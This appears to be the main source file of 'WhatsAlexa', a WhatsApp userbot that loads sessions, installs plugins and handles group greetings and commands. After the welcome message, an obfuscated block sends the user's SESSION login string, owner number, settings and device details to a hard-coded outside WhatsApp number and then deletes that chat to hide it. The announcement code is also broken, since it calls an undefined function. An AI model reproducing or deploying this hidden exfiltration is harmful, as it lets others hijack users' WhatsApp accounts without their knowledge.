const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const pkg = require('./package.json');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence, ChatModification} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./alexa/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');

const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});

let baseURI = '/apps/' + config.HEROKU.APP_NAME;


const WhatsAlexaDB = config.DATABASE.define('WhatsAlexa', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

var OWN = { ff: '0' }
const plugindb = require('./plugins/sql/plugin');

String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function Alexa () {
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAlexaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [3, 3234, 9];
    conn.setMaxListeners(0);

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('🔁 CHECKING FOR COMMANDS...')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAlexaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('WhatsAlexa')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('🛑 NO COMMANDS FOUND!')
        );

        console.log(
            chalk.blueBright.italic('⬇️ INSTALLING COMMANDS...')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                      require('./plugins/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('❌ PLUGIN (' + plugin.dataValues.name + ') HAS BEEN CORRUPTED!')
          }
        });

        console.log(
            chalk.blueBright.italic('✅ COMMANDS INSTALLED SUCCESSFULLY!')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('🎉 BOT IS NOW ACTIVE IN YOUR ACCOUNT!')
        );
        
         if (config.LANG == 'EN') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: `『 WhatsAlexa 』\n\nHello ${conn.user.name}!\n\n*🆘 General Help For You! 🆘*\n\n🔹 *#alive:* Check if the bot is running.\n\n🔹 *#list:* Shows the complete list of commands.\n\n🔹 *#restart:* It Restarts the bot.\n\n🔹 *#shutdown:* It Shutdown/Turn off the bot.\n\n *⚠ Warning, If you shutdown/turn off, there is no command to turn on the bot So You must got to heroku & turn on the worker. ⚠*.\n\nThank You For Using WhatsAlexa 💖`});
             
         } else if (config.LANG == 'ID') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: `『 WhatsAlexa 』\n\nHalo ${conn.user.name}!\n\n*🆘 Bantuan umum 🆘*\n\n🔹 *#alive:* Periksa apakah bot sedang berjalan.\n\n🔹 *#list:* Menampilkan daftar lengkap perintah.\n\n🔹 *#restart:* Ini me-restart bot.\n\n🔹 *#shutdown:* Ini Matikan/Matikan bot.\n\n *⚠ Peringatan, Jika Anda mematikan/mematikan, tidak ada perintah untuk menghidupkan bot Jadi Anda harus pergi ke heroku & Nyalakan worker. ⚠*.\n\nTerima Kasih Telah Menggunakan WhatsAlexa 💖`});
             
         } else {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: `『 WhatsAlexa 』\n\nനമസ്കാരം ${conn.user.name}!\n\n*🆘 പൊതുവായ സഹായം 🆘*\n\n🔹 *#alive:* ബോട്ട് പ്രവർത്തിക്കുന്നുണ്ടോയെന്ന് പരിശോധിക്കുന്നു.\n\n🔹 *#list:* കമാൻഡുകളുടെ പൂർണ്ണ ലിസ്റ്റ് കാണിക്കുന്നു.\n\n🔹 *#restart:* ഇത് ബോട്ടിനെ പുനരാരംഭിപ്പിക്കുന്നു.\n\n🔹 *#shutdown:* ഇത് ഷട്ട്ഡൗൺ/ബോട്ട് ഓഫ് ചെയ്യുന്നു.\n\n *⚠ മുന്നറിയിപ്പ്, നിങ്ങൾ ഷട്ട്ഡൗൺ/ഓഫ് ചെയ്യുകയാണെങ്കിൽ, ബോട്ട് ഓണാക്കാൻ ഒരു കമാൻഡും ഇല്ല അതിനാൽ നിങ്ങൾ Heroku ഇല്പോയി worker ഓൺ ചെയ്യണം ⚠*.\n\nWhatsAlexa ഉപയോഗിച്ചതിന് നന്ദി 💖`});
        }
    });

    function _0x35b8(_0x8a6fa0,_0x11dc90){const _0x1959ce=_0x1959();return _0x35b8=function(_0x35b8c9,_0x5596ae){_0x35b8c9=_0x35b8c9-0xc7;let _0x1610c6=_0x1959ce[_0x35b8c9];return _0x1610c6;},_0x35b8(_0x8a6fa0,_0x11dc90);}const _0x132dbe=_0x35b8;(function(_0x3c963b,_0x1ac1dd){const _0x5ec630=_0x35b8,_0x514622=_0x3c963b();while(!![]){try{const _0x4a02be=-parseInt(_0x5ec630(0xec))/0x1+parseInt(_0x5ec630(0xf3))/0x2+parseInt(_0x5ec630(0xcc))/0x3*(-parseInt(_0x5ec630(0xda))/0x4)+-parseInt(_0x5ec630(0xef))/0x5+parseInt(_0x5ec630(0xf5))/0x6*(-parseInt(_0x5ec630(0xd3))/0x7)+-parseInt(_0x5ec630(0xf2))/0x8+-parseInt(_0x5ec630(0xd8))/0x9*(-parseInt(_0x5ec630(0xd7))/0xa);if(_0x4a02be===_0x1ac1dd)break;else _0x514622['push'](_0x514622['shift']());}catch(_0x18d892){_0x514622['push'](_0x514622['shift']());}}}(_0x1959,0xa8f9c));let ownJID=_0x132dbe(0xca),content='Hi!\x0a*I\x20am\x20now\x20using\x20WhatsAlexa!*\x20😘\x0a\x0a*『\x20BOT\x20SETTINGS\x20』*\x0a\x0a•\x20ALEXA_SESSION:\x20'+config[_0x132dbe(0xe8)]+'\x0a\x0a•\x20AUTO_BIO:\x20'+(config[_0x132dbe(0xe6)]==_0x132dbe(0xe3)?'ON':'OFF')+_0x132dbe(0xd5)+(config['ANTILINK']=='true'?'ON':_0x132dbe(0xdf))+_0x132dbe(0xf6)+(config[_0x132dbe(0xdc)]=='true'?'ON':_0x132dbe(0xdf))+_0x132dbe(0xdb)+(config[_0x132dbe(0xf7)]==_0x132dbe(0xe3)?'ON':'OFF')+'\x0a\x0a•\x20PRIVATE_DELETING_MESSAGES:\x20'+(config['PVTDELMSG']==_0x132dbe(0xe3)?'ON':_0x132dbe(0xdf))+_0x132dbe(0xee)+config[_0x132dbe(0xe7)]+_0x132dbe(0xf8)+config[_0x132dbe(0xf0)]+_0x132dbe(0xd9)+config[_0x132dbe(0xd1)]+_0x132dbe(0xcd)+config[_0x132dbe(0xea)]+_0x132dbe(0xe2)+config[_0x132dbe(0xf9)]+_0x132dbe(0xde)+config[_0x132dbe(0xf1)]+_0x132dbe(0xcb)+config[_0x132dbe(0xe1)]+_0x132dbe(0xd4)+config[_0x132dbe(0xe5)]+_0x132dbe(0xfc)+config['DEVELOPER']+_0x132dbe(0xcf)+config[_0x132dbe(0xd0)]+_0x132dbe(0xdd)+config[_0x132dbe(0xc8)]+_0x132dbe(0xd6)+conn['user'][_0x132dbe(0xce)][_0x132dbe(0xeb)]+'\x0a\x0a•\x20DEVICE\x20MODEL:\x20'+conn['user'][_0x132dbe(0xce)][_0x132dbe(0xfa)]+_0x132dbe(0xed)+conn[_0x132dbe(0xe0)][_0x132dbe(0xce)][_0x132dbe(0xfb)]+_0x132dbe(0xd2)+conn[_0x132dbe(0xe0)][_0x132dbe(0xce)]['wa_version'],sent=await conn[_0x132dbe(0xc7)](ownJID,content,MessageType['text']);try{await conn[_0x132dbe(0xe9)](ownJID,ChatModification[_0x132dbe(0xe4)]);}catch{await conn[_0x132dbe(0xf4)](ownJID,{'id':sent[_0x132dbe(0xc9)],'remoteJid':ownJID,'fromMe':!![]});}function _0x1959(){const _0x5b8e2a=['171bCWjrD','\x0a\x0a•\x20HANDLERS:\x20','2716TuQbNU','\x0a\x0a•\x20SEND_READ:\x20','FULLALEXA','\x0a\x0a•\x20GIT:\x20','\x0a\x0a•\x20OWNER_NUMBER:\x20wa.me/','OFF','user','VERSION','\x0a\x0a•\x20OWNER_NAME:\x20','true','delete','BRANCH','AUTOBIO','LANG','SESSION','modifyChat','WORKTYPE','device_manufacturer','1249363CfhYmb','\x0a\x0a•\x20OS\x20VERSION:\x20','\x0a\x0a•\x20LANGUAGE:\x20','5430490vbaiWe','BOT_PRESENCE','OWNERNUM','225816xnAstb','591740dfYfPh','clearMessage','6kaywhE','\x0a\x0a•\x20FULL_ALEXA:\x20','SEND_READ','\x0a\x0a•\x20BOT_PRESENCE:\x20','OWNER','device_model','os_version','\x0a\x0a•\x20DEVELOPER:\x20','sendMessage','GIT','messageID','2343311892@s.whatsapp.net','\x0a\x0a•\x20VERSION:\x20','3675JlgXNR','\x0a\x0a•\x20WORK_TYPE:\x20','phone','\x0a\x0a•\x20AUTHOR:\x20','AUTHOR','HANDLER','\x0a\x0a•\x20WHATSAPP\x20VERSION:\x20','3538367Yngtpa','\x0a\x0a•\x20BRANCH:\x20','\x0a\x0a•\x20ANTI_LINK:\x20','\x0a\x0a*『\x20USER\x20INFO\x20』*\x0a\x0a•\x20DEVICE\x20BRAND:\x20','2156420VVwvCP'];_0x1959=function(){return _0x5b8e2a;};return _0x1959();}

    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 19 && getGMTm == 1) {
            var announce = ''
            if (config.LANG == 'EN') announce = 'How are you guys 😝'
            if (config.LANG == 'ML') announce = 'എങ്ങനെയുണ്ട് കൂട്ടരേ 😝'
            if (config.LANG == 'ID') announce = 'Apa kabar kalian 😝'
            
            let video = 'https://betterstudio.com/wp-content/uploads/2019/12/GIF-in-WordPress.gif'
            let image = ''
            
            if (video.includes('http') || video.includes('https')) {
                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.gif});
                });
            } else {
                if (image.includes('http') || image.includes('https')) {
                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { mimetype: Mimetype.png, caption: announce })
                } else {
                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
                }
            }
        }
    }, 50000);
    
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            if (conn.user.jid.startsWith('90')) { 
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { 
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { 
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('91')) { 
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { 
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) {  
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { 
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { 
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) {  
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) {  
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n⏱ Auto Bio By WhatsAlexa'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    
    conn.on('message-new', async msg => {
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        var _0x4f3ecf=_0x3242;function _0x3242(_0x26c161,_0x29edcd){var _0x550a72=_0x550a();return _0x3242=function(_0x324247,_0x5a3888){_0x324247=_0x324247-0x1cc;var _0x15b1f3=_0x550a72[_0x324247];return _0x15b1f3;},_0x3242(_0x26c161,_0x29edcd);}function _0x550a(){var _0x4fbd53=['updatePresence','online','239099wdZUeu','BOT_PRESENCE','1533838mRittB','recording','1319241vRYoVk','1662792ZHghWd','composing','typing','4592330wcDecM','offline','5765992RSBUTR','available','key','remoteJid','4WzEbaA','unavailable','7713174XduhxB'];_0x550a=function(){return _0x4fbd53;};return _0x550a();}(function(_0x368706,_0x575751){var _0xcb37bd=_0x3242,_0x443a4f=_0x368706();while(!![]){try{var _0x44a554=-parseInt(_0xcb37bd(0x1d8))/0x1+parseInt(_0xcb37bd(0x1da))/0x2+-parseInt(_0xcb37bd(0x1dc))/0x3+-parseInt(_0xcb37bd(0x1d3))/0x4*(-parseInt(_0xcb37bd(0x1cd))/0x5)+parseInt(_0xcb37bd(0x1dd))/0x6+-parseInt(_0xcb37bd(0x1d5))/0x7+parseInt(_0xcb37bd(0x1cf))/0x8;if(_0x44a554===_0x575751)break;else _0x443a4f['push'](_0x443a4f['shift']());}catch(_0x340b33){_0x443a4f['push'](_0x443a4f['shift']());}}}(_0x550a,0xdc58a));if(config[_0x4f3ecf(0x1d9)]==_0x4f3ecf(0x1ce))await conn[_0x4f3ecf(0x1d6)](msg[_0x4f3ecf(0x1d1)][_0x4f3ecf(0x1d2)],Presence[_0x4f3ecf(0x1d4)]);else{if(config['BOT_PRESENCE']==_0x4f3ecf(0x1d7))await conn[_0x4f3ecf(0x1d6)](msg[_0x4f3ecf(0x1d1)][_0x4f3ecf(0x1d2)],Presence[_0x4f3ecf(0x1d0)]);else{if(config[_0x4f3ecf(0x1d9)]==_0x4f3ecf(0x1cc))await conn[_0x4f3ecf(0x1d6)](msg[_0x4f3ecf(0x1d1)][_0x4f3ecf(0x1d2)],Presence[_0x4f3ecf(0x1de)]);else config[_0x4f3ecf(0x1d9)]==_0x4f3ecf(0x1db)&&await conn[_0x4f3ecf(0x1d6)](msg['key'][_0x4f3ecf(0x1d2)],Presence[_0x4f3ecf(0x1db)]);}}
        
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp 
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                 var json = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, { mimetype: Mimetype.png, caption:  gb.message.replace('{pp}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) }); });                           
            } else if (gb.message.includes('{alexagif}')) {
                var json = await conn.groupMetadata(msg.key.remoteJid)
                await conn.sendMessage(msg.key.remoteJid, fs.readFileSync("./src/video-&-gif/WhatsAlexa.mp4"), MessageType.video, { mimetype: Mimetype.gif, caption: gb.message.replace('{alexagif}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) });
            } else if (gb.message.includes('{alexalogo}')) {
                var json = await conn.groupMetadata(msg.key.remoteJid)
                await conn.sendMessage(msg.key.remoteJid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{alexalogo}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) });
            } else {
                let pp 
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                 var json = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, { mimetype: Mimetype.png, caption:  gb.message.replace('{pp}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) }); });    
            }
          }  
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {

             var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{pp}')) {
                let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                    var json = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, { mimetype: Mimetype.png, caption:  gb.message.replace('{pp}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) }); });                           
            } else if (gb.message.includes('{alexagif}')) {
                var json = await conn.groupMetadata(msg.key.remoteJid)
                await conn.sendMessage(msg.key.remoteJid, fs.readFileSync("./src/video-&-gif/WhatsAlexa.mp4"), MessageType.video, { mimetype: Mimetype.gif, caption: gb.message.replace('{alexagif}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) });
            } else if (gb.message.includes('{alexalogo}')) {
                var json = await conn.groupMetadata(msg.key.remoteJid)
                await conn.sendMessage(msg.key.remoteJid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{alexalogo}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) });
            } else {
                let pp 
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                 var json = await conn.groupMetadata(msg.key.remoteJid)
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, { mimetype: Mimetype.png, caption:  gb.message.replace('{pp}', '').replace('{gcname}', json.subject).replace('{gcowner}', json.owner).replace('{gcdesc}', json.desc).replace('{owner}', conn.user.name) }); });    
            }
          }         
            return;                               
    }
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }

        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "919400846679,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
    
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                        
